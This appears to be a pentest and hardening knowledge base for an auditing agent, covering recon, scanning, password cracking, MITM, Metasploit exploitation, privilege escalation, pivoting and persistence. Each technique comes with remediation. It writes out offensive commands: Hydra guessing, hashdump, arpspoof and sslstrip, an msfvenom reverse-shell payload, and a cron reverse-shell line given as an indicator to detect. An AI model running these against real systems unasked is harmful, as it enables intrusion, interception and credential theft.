# Network, Host & Deployment Security — Techniques Knowledge Base

Grounded catalog for an agent that audits **deployments, SSH/network config, and
hosts** — not just web-app code.

- "requires authorization" = active/destructive step; run only against an
  **in-scope target with written permission** (the "get-out-of-jail-free card").
  Passive detection steps are safe to run in an audit.

---

## Ordered methodology phases

1. **Pre-engagement** — agree scope (in/out-of-scope IPs & hosts), testing
   window, contacts, allowed actions (exploits? DoS? social eng?), payment,
   written authorization + NDA. Note fragile devices (SCADA, medical) that even
   a port scan can crash.
2. **Information gathering** — OSINT (legal/public sources) + active recon
   (port scanning, service enumeration). Map the Internet footprint & attack
   surface.
3. **Threat modeling** — rank findings by value/impact; build attack plans.
4. **Vulnerability analysis** — scanners + manual verification of what's
   actually exploitable.
5. **Exploitation** — run exploits to gain a foothold.
6. **Post-exploitation** — local info gathering, privilege escalation, lateral
   movement/pivoting, persistence; determine real business impact.
7. **Reporting** — executive summary (posture, risk profile, road map) +
   technical report (per-phase findings, risk/exposure, remediation).

PTES reference: http://www.pentest-standard.org/

---

## A. Reconnaissance / intelligence gathering

### id: recon-osint — OSINT footprinting
- **what**: Learn org/infrastructure from public sources before sending packets.
- **where-it-lives**: DNS records, WHOIS, web-server tech banners, employee
  email addresses, job postings (name deployed platforms), social media.
- **how-to-detect**: `whois <domain>` (owner/registrar/name servers — often
  hidden behind privacy proxy); Netcraft (uptime, OS, web server); Maltego
  transforms (domain→MX, →website, →server technologies); theHarvester
  (`theharvester -d <domain> -l 500 -b all`) for emails/hosts.
- **how-to-test**: Cross-reference discovered hosts against in-scope list;
  confirm tech stack before choosing exploits.
- **remediation**: Use private WHOIS registration; minimize employee emails in
  public listings; avoid leaking stack details in banners/job posts; scrub
  metadata.
- **tools**: whois, nslookup, host, theHarvester, Maltego, Netcraft.

### id: recon-dns — DNS reconnaissance & zone transfer
- **what**: Enumerate hosts/mail servers; a misconfigured DNS server leaks the
  entire zone.
- **where-it-lives**: Authoritative name servers; MX/A/NS records.
- **how-to-detect**: `nslookup <host>`; `nslookup` → `set type=mx` → `<domain>`;
  `host -t ns <domain>` to list name servers.
- **how-to-test** (requires authorization / in-scope): attempt AXFR zone
  transfer `host -l <domain> <nameserver>` — success dumps all records (host
  naming reveals mail/webmail/VPN targets).
- **remediation**: Restrict zone transfers to authorized secondary servers
  only (`allow-transfer` allowlist); split-horizon DNS; don't expose internal
  names externally.
- **tools**: nslookup, host, dig (`dig axfr`).

---

## B. Network scanning (nmap, port states, service/version detection)

### id: scan-manual-banner — Manual port probe / banner grab
- **what**: Connect to a port with netcat/telnet, read the service banner.
- **where-it-lives**: Listening TCP ports; SMTP(25), POP3(110), FTP(21), HTTP(80).
- **how-to-detect**: `nc -v <ip> <port>` (open reports "open" + banner, e.g.
  `220 ... SLmail 5.5.0.4433`); banners can be forged, so treat as a lead.
- **how-to-test**: Speak the protocol manually (`GET / HTTP/1.1`, SMTP `VRFY`).
- **remediation**: Suppress/strip version banners; keep services patched so an
  accurate banner isn't a liability.
- **tools**: netcat (`nc`), telnet.

### id: scan-syn — Nmap SYN (stealth) scan
- **what**: Half-open TCP scan — sends SYN, gets SYN-ACK if open, never
  completes handshake. Fast, doesn't fully connect.
- **where-it-lives**: TCP services across an IP range.
- **how-to-detect**: `nmap -sS <ip range> -oA <basename>` (`-oA` = all output
  formats: .nmap/.gnmap/.xml for tooling & records).
- **port states**: `open` = service listening; `closed` = reachable, nothing
  listening; `filtered` = no reply, firewall likely dropping. All-hosts-alive
  or all-filtered results usually mean a firewall/IPS is interfering.
- **how-to-test** (requires authorization): compare open ports to the intended
  service inventory; a port open ≠ vulnerable, just attack surface.
- **remediation**: Firewall/deny unneeded ports; IDS/IPS to flag scan traffic.
- **tools**: nmap, masscan (mass SYN at scale).

### id: scan-version — Nmap version / full-connect scan
- **what**: Completes the connection and fingerprints software + version
  (banner grabbing + probes). Richer than SYN but louder.
- **where-it-lives**: Same ports; adds VERSION column (e.g. `vsftpd 2.3.4`,
  `OpenSSH 5.1p1`, `Apache 2.2.9`, `Microsoft IIS 7.5`).
- **how-to-detect**: `nmap -sV <range>` (or full TCP connect `nmap -sT`).
- **how-to-test** (requires authorization): map versions → known CVEs. WARNING:
  version probes can **crash fragile services** (e.g. the Zervit web server
  crashed on `-sV`); warn client. Version may be wrong if banner not updated
  after patch.
- **remediation**: Patch; minimize exposed services.
- **tools**: nmap `-sV`.

### id: scan-udp — Nmap UDP scan
- **what**: Sends protocol-specific UDP packets; connectionless so logic
  differs. Response = open; ICMP port-unreachable = closed; no reply =
  `open|filtered` (ambiguous).
- **where-it-lives**: UDP services — TFTP(69), NTP(123), NetBIOS(137/138),
  SNMP(161), NFS(2049), IKE/isakmp(500), DNS(53), DHCP.
- **how-to-detect**: `nmap -sU <range> -oA <basename>` (slow).
- **remediation**: Filter UDP at firewall; disable unneeded UDP services (TFTP,
  legacy NetBIOS, open SNMP).
- **tools**: nmap `-sU`.

### id: scan-fullports — Full port-range scanning
- **what**: Default nmap scans only ~1000 "interesting" ports; listeners hide
  on the other 64k. The Zervit web server has been found on TCP 3232 only via
  `-p`.
- **how-to-detect**: `nmap -sS -p <port> <ip>` for a specific port;
  `nmap -p 1-65535 <ip>` for all TCP. Rule of thumb: scan all 65535.
- **remediation**: Inventory every listener; close nonstandard/forgotten ports.
- **tools**: nmap `-p`.

---

## C. Finding open / unnecessary ports and services

### id: svc-attack-surface — Minimize exposed services
- **what**: External surface should expose only mission-critical remotely-needed
  services (web, mail, VPN, maybe SSH/FTP). Internal networks expose far more.
- **where-it-lives**: nmap results; `ss -tulpn` / `netstat -tulpn` (Linux),
  `netstat -ano` (Windows), `lsof -i` / `sockstat` (mac/BSD) run on the host.
- **how-to-detect**: Cross-platform local audit —
  - Linux: `ss -tulpn` (or `netstat -tulpn`) lists listening TCP/UDP + PID/prog.
  - macOS: `lsof -nP -iTCP -sTCP:LISTEN` and `lsof -nP -iUDP`.
  - Windows: `netstat -ano` + map PID via `tasklist`.
  Compare to nmap external view — anything listening that isn't needed is a
  finding.
- **remediation**: Disable/uninstall unnecessary services; bind services to
  localhost when not remotely needed; firewall-deny by default (allowlist).
- **tools**: nmap, ss, netstat, lsof.

### id: svc-anon-ftp — Anonymous / default-access services
- **what**: Anonymous FTP, open NFS shares, open admin panels — access without
  (or with default) credentials.
- **where-it-lives**: FTP(21), NFS(2049)/rpcbind(111), phpMyAdmin, WebDAV,
  DB admin consoles.
- **how-to-detect**: nmap NSE `ftp-anon`; Metasploit `scanner/ftp/anonymous`;
  browse to admin panel URLs (phpMyAdmin often reachable + open in XAMPP).
- **how-to-test** (requires authorization): log in as `anonymous`; assess what
  files are exposed (Nessus ranks anon-FTP medium, but risk depends on
  data — proprietary source on a public FTP = critical).
- **remediation**: Disable anonymous access; require auth on admin panels or
  restrict to localhost/VPN; change all default credentials.
- **tools**: nmap NSE, Metasploit auxiliary, cadaver (WebDAV).

---

## D. Vulnerability identification

### id: vuln-nessus — Automated vulnerability scanning
- **what**: Nessus runs active checks against a vuln DB; ranks by CVSS v2
  (NIST). Can do authenticated (credentialed) scans for deeper host coverage.
- **where-it-lives**: Nessus web UI on TCP 8834 (`service nessusd start`).
- **how-to-detect/test** (requires authorization — loud, may trip IDS or crash
  fragile hosts): create policy (Basic Network Scan, internal/external) →
  add targets → run → review criticals (a common finding is missing MS08-067
  plus other SMB patches). Export PDF/HTML/XML/CSV.
- **caveat**: CVSS rank ≠ real risk in context; always manually verify. Never
  ship raw scanner output as a pentest report.
- **remediation**: Patch management program; run credentialed scans routinely.
- **tools**: Nessus (Home = 16 IPs free), OpenVAS (open-source),
  Nuclei/Nmap-vuln.

### id: vuln-nse — Nmap Scripting Engine
- **what**: NSE scripts for info gathering, active vuln checks, default-cred and
  compromise detection. Scripts live at `/usr/share/nmap/scripts`; categories
  include `default`, `safe`, `discovery`, `auth`, `vuln`, `dos`.
- **how-to-detect**: `nmap -sC <range>` (runs `default` scripts — safe-ish);
  `nmap --script=<name> <ip>`; `nmap --script-help <name|category>`.
- **useful scripts**: `ftp-anon` (anon FTP), `smtp-commands` (finds
  `VRFY`), `nfs-ls` (mounts & audits NFS share perms — exposed `.ssh` dirs),
  `http-title`. `smb-check-vulns` checks MS08-067 but is **dangerous** (dos
  category) — may crash the host; don't run on production.
- **how-to-test** (requires authorization for active/vuln/dos scripts).
- **remediation**: Fix what scripts flag (anon access, writable NFS, verbose
  SMTP verbs); patch SMB.
- **tools**: nmap NSE.

### id: vuln-web-scan — Web-app / service vuln scanning
- **what**: Nikto scans web servers for dangerous files, outdated versions,
  misconfigurations, known-vulnerable apps.
- **how-to-detect**: `nikto -h <ip>` (e.g. finds outdated TikiWiki with RCE;
  reports OSVDB IDs). Also identify installed prebuilt apps (payroll, webmail,
  CMS) with known CVEs.
- **remediation**: Patch/upgrade web apps; remove default sample apps; don't
  expose management interfaces.
- **tools**: Nikto, OWASP ZAP, nuclei.

### id: vuln-msf-scan — Metasploit scanner & check modules
- **what**: Auxiliary modules scan many hosts for a condition (won't give
  shell); some exploits have a `check` function that verifies vulnerability
  without exploiting.
- **how-to-detect**: `use scanner/ftp/anonymous` → `set RHOSTS <range>` →
  `exploit`; `use scanner/smb/pipe_auditor` (enumerate SMB pipes);
  `use scanner/smb/smb_version`. For check: `use <exploit>` → `set RHOST` →
  `check` (e.g. MS08-067 reports "target is vulnerable"). Not all modules
  implement `check`.
- **remediation**: Patch flagged issues.
- **tools**: Metasploit auxiliary/scanner.

### id: vuln-default-creds — Default & known credentials
- **what**: Software shipped with documented default logins that were never
  changed (huge easy win).
- **where-it-lives**: WebDAV (XAMPP default `wampp:xampp`), FileZilla FTP
  built-in `newuser:wampp`, DB consoles, appliances, routers.
- **how-to-detect**: identify product/version → search vendor docs / Google for
  defaults; `cadaver http://<ip>/webdav` and try defaults.
- **remediation**: Change every default credential at deploy; config baseline
  check for known defaults.
- **tools**: cadaver, browser, vendor docs.

### id: vuln-manual — Manual analysis & research
- **what**: Human judgment on strange ports, fragile services, business risk —
  what scanners miss. Directory traversal / local file inclusion (Zervit 0.4:
  `GET /../../../../boot.ini`) let files be pulled without auth.
- **how-to-detect**: talk to service via netcat; research version in
  CVE/MITRE, SecurityFocus, Exploit-DB, PacketStorm, OSVDB; search
  `cve:2003-0264` inside msfconsole.
- **caveat**: public exploit code may be malicious/destructive — vet before
  running.

---

## E. Password attacks & credential hygiene

### id: pw-online — Online password guessing (brute/dictionary)
- **what**: Automated login attempts against a live service until valid creds
  found. Dictionary/educated guesses beat pure brute force.
- **where-it-lives**: Any auth service — POP3/IMAP/SMTP, SSH, FTP, RDP, HTTP,
  DB.
- **how-to-detect/test** (requires authorization): Hydra —
  `hydra -L users.txt -P passwords.txt <ip> pop3`, or `-l <user>` for known
  user. Build user lists from naming scheme (jsmith); enrich wordlists with
  ceWL (spiders site: `cewl -w out.txt -d 1 -m 5 <url>`), Crunch (keyspace),
  rockyou.txt (`/usr/share/wordlists`).
- **detection/noise**: locks out accounts, trips IPS, gets IP blocked at
  perimeter. Slow/randomize to evade (tradeoff: slower).
- **remediation**: Account lockout thresholds; rate limiting; strong password
  policy; 2FA/MFA (Gmail/Dropbox model — defeats guessing); ban common
  passwords.
- **tools**: Hydra, Medusa, Ncrack.

### id: pw-offline — Offline hash cracking
- **what**: Grab password hashes, crack offline (no lockout/noise). Guess →
  hash → compare.
- **where-it-lives**: Windows SAM (`C:\Windows\System32\config`, backups in
  `C:\Windows\repair`) + SYSTEM (holds Syskey bootkey); Linux `/etc/shadow`;
  app config files (FileZilla `FileZilla Server.xml` = MD5).
- **how-to-detect/obtain**: Meterpreter `hashdump` / `post/windows/gather/
  hashdump` / `smart_hashdump` (also AD hashes from a DC); from SAM+SYSTEM use
  `bkhive system key.txt` then `samdump2 sam key.txt`; physical access → boot
  a live CD, `mount /dev/sda1`, run bkhive/samdump2 (bypasses OS controls).
- **how-to-test** (requires authorization): John the Ripper (`john hashes.txt`,
  `--format=nt`, `--wordlist=`, `--rules` for mangling), Rainbow tables
  (Rcrack), online services (CloudCracker: NTLM/SHA-512/WPA2).
- **tools**: John the Ripper, hashcat, bkhive, samdump2, Rcrack.

### id: pw-lm-ntlm — Weak Windows hash algorithms (LM vs NTLM)
- **what**: LM hash is cryptographically broken — password uppercased,
  truncated to 14, split into two 7-char halves hashed separately → any LM hash
  crackable in minutes–hours regardless of password strength. Win XP stores
  BOTH LM+NTLM by default; Win7+ NTLM only. NTLM crackability depends on
  password length/complexity + wordlist.
- **where-it-lives**: SAM; `hashdump` output field 3 = LM, field 4 = NTLM.
  Empty LM = `aad3b435b51404eeaad3b435b51404ee`.
- **remediation**: Disable LM hash storage (`NoLMHash` / policy "Do not store LM
  hash"); enforce long complex passwords; retire legacy Windows (a decommissioned
  Win2000 DC with LM hashes + a reused domain-admin password can compromise an
  otherwise-hardened Win2008 domain).

### id: pw-hygiene — Credential-hygiene findings
- **what**: Root failures to flag in any audit:
  - **Password reuse** across sites/systems (forum pw = corp pw).
  - **Plaintext storage** — in files, `.bash_history` (`cat ~/.bash_history`),
    app configs, WinSCP saved sessions, notes/Post-its.
  - **Shared local-admin password** from a common install image (crack once →
    log into many hosts).
  - **Passwords in memory** dumpable via tools (WCE / Mimikatz).
  - **Infrequent rotation** of privileged accounts.
- **how-to-detect**: `search -f *password*` (Meterpreter); grep configs;
  `post/windows/gather/credentials/*` modules (e.g. `winscp`).
- **remediation**: Unique per-account/per-host credentials (LAPS for
  local admin), secrets manager instead of plaintext files, MFA, rotation,
  strong policy (long, multi-class, non-dictionary).

---

## F. Packet capture / sniffing & network-protocol weaknesses

### id: sniff-capture — Traffic capture (what it reveals)
- **what**: Sniffing reveals plaintext credentials, session data, where users
  browse, VoIP audio. Hubbed networks: all traffic visible (promiscuous mode);
  switched networks: only your own + broadcast — need MITM to see more.
- **where-it-lives**: The wire / NIC; local segment.
- **how-to-detect**: Wireshark (GUI): capture on interface, filter
  `ftp` / `ip.dst==<ip>` / `ip.dst==<ip> and ftp`, right-click → **Follow TCP
  Stream** (reconstructs full convo incl. plaintext FTP creds `USER/PASS`).
  CLI: `tcpdump -i eth0 -w cap.pcap`, `tcpdump -i eth0 port 21 -A` (ASCII
  payload), `tcpdump host <ip> and tcp`, `tshark -r cap.pcap`.
- **finding**: Any credential/PII visible in cleartext = protocol should be
  encrypted.
- **remediation**: Use encrypted protocols (FTPS/SFTP not FTP, SSH not telnet,
  HTTPS everywhere, IMAPS/POP3S); switched networks + port security; disable
  promiscuous where not needed.
- **tools**: Wireshark, tshark, tcpdump.

### id: sniff-arp — ARP cache poisoning (MITM)
- **what**: ARP has no authentication — any host can answer "who has IP X". Send
  forged ARP replies so target maps a victim IP to attacker MAC → traffic
  routes through attacker. Impersonate a host or the default gateway.
- **where-it-lives**: Local L2 segment; ARP cache (`arp -a`).
- **how-to-detect**: watch `arp -a` for a MAC that changes / one MAC on multiple
  IPs; Wireshark `arp` filter shows gratuitous/duplicate replies; ARP-storm.
- **how-to-test** (requires authorization — can DoS the segment): enable IP
  forwarding (`echo 1 > /proc/sys/net/ipv4/ip_forward`) then
  `arpspoof -i eth0 -t <victim> <impersonated>` (both directions for full MITM).
  Without forwarding = denial of service.
- **remediation**: Dynamic ARP Inspection + DHCP snooping on switches; static
  ARP for critical hosts; network segmentation; port security.
- **tools**: arpspoof (dsniff), Ettercap, Bettercap.

### id: sniff-dns — DNS cache poisoning / spoofing
- **what**: Forge DNS replies (paired with ARP MITM) to map a domain to an
  attacker IP → redirect victims to attacker server.
- **how-to-detect**: `nslookup <domain>` from victim returns attacker IP;
  compare against authoritative answer.
- **how-to-test** (requires authorization): `dnsspoof -i eth0 -f hosts.txt`
  (hosts.txt maps `<attacker-ip> <domain>`), with arpspoof running.
- **remediation**: DNSSEC; trusted internal resolvers; prevent L2 MITM (see
  arp); HSTS/cert pinning limits impact.
- **tools**: dnsspoof (dsniff), Ettercap.

### id: sniff-ssl — SSL/TLS MITM & SSL stripping
- **what**: (1) SSL MITM presents an invalid cert — captures plaintext IF user
  clicks through the warning. (2) SSL stripping (sslstrip) MITMs the HTTP→HTTPS
  redirect, keeps HTTPS to the server but serves HTTP to victim → **no cert
  warning**; captures POST creds in plaintext.
- **how-to-test** (requires authorization): Ettercap
  `ettercap -Ti eth0 -M arp:remote /gw/ /target/` (does ARP+DNS+SSL MITM);
  sslstrip: `iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT
  --to-port 8080` then `sslstrip -l 8080` + arpspoof gateway.
- **remediation**: **HSTS** (+ preload) defeats stripping; HTTPS-only, no
  HTTP→HTTPS reliance on user typing; valid CA certs (self-signed trains users
  to click through — even Nessus's own self-signed cert is an example); HPKP/cert
  pinning; modern TLS only.
- **tools**: Ettercap, sslstrip, Bettercap.

### id: sniff-smb-auth — SMB auth weaknesses (NetLM/NetNTLM capture)
- **what**: SMB sends a challenge-response (LM/NTLM hash), not plaintext. A
  rogue SMB server captures NetLM/NetNTLM responses when a victim authenticates
  to it → crack or relay.
- **how-to-test** (requires authorization): Metasploit
  `auxiliary/server/capture/smb` (`set JOHNPWFILE`), trigger victim
  `net use \\<attacker>\share`.
- **remediation**: Disable LM/NTLMv1 (enforce NTLMv2 / Kerberos); SMB signing
  (blocks relay); don't let hosts auth to arbitrary SMB servers (egress filter
  445).
- **tools**: Metasploit capture/smb, Responder, ntlmrelayx.

---

## G. Exploitation & Metasploit workflow (conceptual)

### id: msf-workflow — Metasploit framework flow
- **what**: De-facto exploit framework. Modules: exploits, auxiliary
  (scan/fuzz/dos), post, payloads, encoders, nops.
- **workflow**:
  1. Start DB + service: `service postgresql start`, `msfconsole`.
  2. Find module: `search <cve|ms##|term>` or module DB; read `info <module>`
     (rank manual→excellent, targets, options, payload space, references).
  3. `use <module>` → `show options` → `set RHOST/RPORT/...`.
  4. `set payload <payload>`; `set LHOST/LPORT`.
  5. `exploit` (or `check` first to verify without exploiting).
- **rank meaning**: `excellent` never crashes service; memory-corruption bugs
  (MS08-067 = `great`) can crash — pick target carefully.
- **payload types**: bind shell (listens on target port), reverse shell (calls
  back to attacker — needed when target can't be reached inbound), plus
  special (adduser, exec, download_exec). **Staged** (`windows/shell/reverse_tcp`
  — small stager pulls rest; fits tight space) vs **inline/single**
  (`windows/shell_reverse_tcp` — self-contained, more stable). Distinguish by
  `/` vs `_` in name.
- **Meterpreter**: in-memory reflective-DLL payload, writes nothing to disk,
  TLS-encrypted, evades some IPS/IDS; rich commands (`getuid`, `hashdump`, `ps`,
  `migrate`, `upload`, `search`, keylog).
- **Msfvenom**: generate standalone payloads
  (`msfvenom -p php/meterpreter/reverse_tcp LHOST=.. LPORT=.. -f raw > x.php`);
  catch with `use multi/handler` + matching payload/LHOST/LPORT.

### id: exploit-classes — Exploited weakness classes
- **what**: Deployment misconfigs/vulns commonly chained end to end:
  - Missing OS patch → remote code exec (MS08-067 SMB, no auth needed).
  - Vulnerable 3rd-party service (SLMail POP3 buffer overflow CVE-2003-0264;
    Zervit directory traversal; TikiWiki PHP RCE).
  - Default credentials (WebDAV `wampp:xampp` → upload PHP shell = code exec).
  - Open admin panel (phpMyAdmin root → `SELECT ... INTO OUTFILE` writes PHP
    webshell).
  - Backdoored software (vsftpd 2.3.4 `:)` username → root shell on 6200).
  - Weak file access control (world read/write NFS `.ssh` → append attacker key
    to `authorized_keys`, log in without password).
  - Web server running as SYSTEM → full host control from a webshell.
- **remediation** (cross-cutting): patch OS + 3rd-party promptly; remove default
  creds & sample apps; least-privilege service accounts (never run web/DB as
  SYSTEM/root); lock down file/share permissions; validate software supply chain.

---

## H. Privilege escalation

### id: privesc-win — Windows local privilege escalation
- **what**: Turn limited-user/service access into SYSTEM.
- **where-it-lives**: Missing kernel/driver patches; UAC config; service
  tokens.
- **how-to-detect/test** (requires authorization): Meterpreter `getuid` to see
  current privs; `getsystem` (auto-tries named-pipe impersonation / token
  duplication — needs admin); local exploit modules e.g.
  `exploit/windows/local/ms11_080_afdjoinleaf` (`set SESSION`); UAC bypass
  `exploit/windows/local/bypassuac` then `getsystem`. Railgun (`irb` →
  `client.railgun.shell32.IsUserAnAdmin`) checks admin status.
- **remediation**: Patch (MS11-080 patched 2011 — fully patched host immune);
  keep UAC enabled at max; least privilege; app whitelisting.
- **tools**: Metasploit local exploits, getsystem, Incognito.

### id: privesc-linux — Linux local privilege escalation
- **what**: Exploit outdated kernel / SUID / misconfig to reach root.
- **where-it-lives**: kernel version, vulnerable daemons (e.g. udev
  CVE-2009-1185 — udevd runs as root, doesn't verify request origin).
- **how-to-detect/test** (requires authorization): enumerate —
  `uname -a`, `lsb_release -a`, `<daemon> --version`; find exploit
  (`searchsploit udev`, Exploit-DB at `/usr/share/exploitdb`); compile on target
  (`gcc -o exploit 8572.c`) and run per its usage; catch root shell on netcat
  listener.
- **remediation**: Patch kernel & packages; remove unneeded SUID binaries;
  keep distro current (an out-of-date release like Ubuntu 8.10 is a prime
  target); disable unused device/driver loading; AppArmor/SELinux.
- **tools**: searchsploit, gcc, netcat; LinPEAS/linux-exploit-suggester.

---

## I. Lateral movement / pivoting

### id: lateral-psexec — PSExec & Pass-the-Hash
- **what**: With valid creds (or just the **hash**) to `ADMIN$`, upload a
  service exe, run it via Service Control Manager → SYSTEM shell. Pass-the-Hash:
  supply LM:NTLM hash instead of plaintext (`set SMBPass <lm>:<ntlm>`) — no
  cracking needed. Reused local-admin passwords let one crack open many hosts.
- **how-to-test** (requires authorization): `use exploit/windows/smb/psexec` →
  `set SMBUser/SMBPass/RHOST` → `exploit`.
- **remediation**: Unique local-admin passwords per host (LAPS);
  restrict admin-share access; SMB signing; disable LM/NTLMv1; limit where
  privileged accounts log in; EDR on service-exe drops.

### id: lateral-ssh-token — SSHExec / token impersonation / SMB capture
- **what**: SSHExec (`exploit/multi/ssh/sshexec`) reuses valid SSH creds across
  Linux hosts. Windows **token impersonation** (Incognito: `load incognito`,
  `list_tokens -u`, `impersonate_token DOMAIN\\user`) steals a logged-in user's
  delegation token → their privileges (incl. domain admin) without password.
  Tokens persist until reboot.
- **remediation**: Limit interactive logins of privileged accounts on lower-trust
  hosts; unique SSH keys per host; reboot/logoff hygiene; monitor lateral auth.

### id: pivot-route — Pivoting into segmented networks
- **what**: Use a dual-homed compromised host as a jump box into an unreachable
  network. `ifconfig`/`ip a` on the pivot reveals a second subnet.
- **how-to-test** (requires authorization): Metasploit
  `route add <subnet> <mask> <session>`; scan via `scanner/portscan/tcp`;
  exploit via **bind** payload (reverse can't route back); or proxy external
  tools: `auxiliary/server/socks4a` + edit `/etc/proxychains.conf`
  (`socks4 127.0.0.1 1080`) → `proxychains nmap -Pn -sT -sV -p .. <ip>`. Also
  SSH tunneling.
- **remediation**: **Network segmentation** — DMZ for Internet-facing/dual-homed
  hosts, isolated from sensitive internal resources; egress filtering; don't put
  Internet-facing systems on the internal domain; internal firewalls between
  business units / sensitivity tiers; block inter-VLAN routing by default
  (allowlist).

---

## J. Persistence (detect on hosts you audit)

### id: persist — Backdoor persistence indicators
- **what**: Attacker footholds that survive reboot.
- **where-it-lives / how-to-detect**:
  - **Rogue accounts**: `net user` / `net localgroup Administrators` (Windows),
    `/etc/passwd` + sudoers (Linux) — unexpected users, esp. in admin/Domain
    Admins.
  - **Autorun**: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` (Metasploit
    `persistence` script drops a `.vbs` in `%TEMP%` + Run key or service).
  - **cron**: `/etc/crontab` lines like
    `*/10 * * * * root nc <ip> 12345 -e /bin/bash` — reverse shell on a timer.
  - **Services** installed to relaunch payloads.
- **remediation**: Baseline & monitor accounts/autoruns/cron/services; alert on
  new admin users; file-integrity monitoring; remove attacker artifacts — always
  document & undo every change made on a target.

---

## K. SSH hardening checklist

`sshd_config` (`/etc/ssh/sshd_config`) — audit these:
- **Key-based auth** — public-key is the strongest SSH auth; but a
  world-writable `~/.ssh/authorized_keys` (e.g. via open NFS) lets an attacker
  add their key and bypass passwords → protect key files (`chmod 700 ~/.ssh`,
  `600 authorized_keys`, correct ownership).
- `PermitRootLogin no`.
- `PasswordAuthentication no` (keys only) once keys deployed; else strong
  passwords + rate limiting (SSH is a brute-force target — id:pw-online).
- `PubkeyAuthentication yes`; protect/rotate private keys; passphrase-protect
  keys.
- Restrict via `AllowUsers`/`AllowGroups` (allowlist); bind to management
  network / VPN, not 0.0.0.0.
- Modern crypto only (`Protocol 2` — an OpenSSH 5.1p1 target is out of date;
  upgrade); disable weak ciphers/MACs/kex.
- `MaxAuthTries` low; fail2ban/lockout; move off default port only as
  obscurity (not a control).
- Don't reuse the same SSH key/credential across hosts (limits lateral movement,
  id:lateral-ssh-token).

---

## L. Host / network hardening checklist

- **Patch management** — OS + 3rd-party; the single biggest theme (MS08-067 from
  2008 still winning pentests; udev; SLMail). Long-term patch plan, not one-off.
- **Minimize attack surface** — expose only mission-critical services; close
  nonstandard ports; bind internal services to localhost.
- **No default credentials** anywhere; change at deploy.
- **No open/anonymous access** — FTP, NFS, admin panels require auth or are
  network-restricted; lock down share/file permissions (no world-writable
  `.ssh`, no over-broad NFS exports).
- **Least-privilege service accounts** — never run web/DB servers as
  SYSTEM/root.
- **Encrypt protocols in transit** — kill telnet/FTP/plain-HTTP/POP3/IMAP;
  HSTS to stop SSL stripping.
- **Strong auth** — long complex non-dictionary passwords, MFA, no reuse, no
  plaintext storage, regular rotation, disable LM/NTLMv1, SMB signing.
- **L2 protections** — DHCP snooping + Dynamic ARP Inspection, port security,
  DNSSEC, trusted resolvers (defeat ARP/DNS MITM).
- **Segmentation & firewalling** — default-deny allowlist firewalls; DMZ for
  Internet-facing/dual-homed hosts isolated from sensitive internal nets;
  internal segmentation by unit/sensitivity so one host ≠ whole network; egress
  filtering.
- **Retire legacy systems** — old OS with weak hashing (Win2000/XP LM) + reused
  admin passwords collapse an otherwise-strong domain.
- **Detection** — IDS/IPS for scan/exploit traffic, account lockout, EDR;
  baseline & monitor accounts/autoruns/cron/services for persistence.

---

## M. Tools index (open-source unless noted)

| Tool | Use |
|---|---|
| nmap (+NSE) | port/version/UDP scan, script vuln checks |
| masscan | fast large-scale SYN scan |
| netcat (`nc`), telnet | manual port probe, banner grab, shells, file xfer |
| ss / netstat / lsof | local listening-port audit (Linux/mac/Win) |
| whois, nslookup, host, dig | DNS/WHOIS recon, zone transfer |
| theHarvester, Maltego, Netcraft | OSINT |
| Nessus (comm; Home free) / OpenVAS | vuln scanning |
| Nikto / OWASP ZAP / nuclei | web vuln scan |
| Metasploit / msfvenom | exploit, aux scan, check, post, pivot |
| Wireshark / tshark / tcpdump | packet capture & analysis |
| arpspoof, dnsspoof (dsniff), Ettercap, sslstrip, Bettercap | MITM |
| Hydra / Medusa / Ncrack | online password guessing |
| John the Ripper / hashcat | offline hash cracking |
| bkhive, samdump2, Rcrack | Windows SAM hash recovery / rainbow tables |
| ceWL, Crunch, rockyou.txt | wordlist generation |
| cadaver | WebDAV client |
| searchsploit / Exploit-DB | local exploit repo search |
| proxychains, Metasploit socks4a | pivot external tools through a session |
| lynis | host hardening audit (SSH/config baseline) |

---

## N. Reporting (deliverable structure)

- **Executive summary**: background/definitions, overall posture, risk profile
  (high/mod/low vs peers), general findings + metrics, recommendation summary,
  strategic road map (short- and long-term, e.g. patch now + build patch mgmt).
- **Technical report**: intro (scope/contacts), information gathering (Internet
  footprint), vulnerability assessment, exploitation/verification, post
  exploitation, risk/exposure (quantified loss), conclusion.
- Translate impact to business terms ("I read your email"), not jargon.
- Keep notes/logs of everything (nmap `-oA`, `script`, Dradis) for
  the report and to undo all changes made on targets.
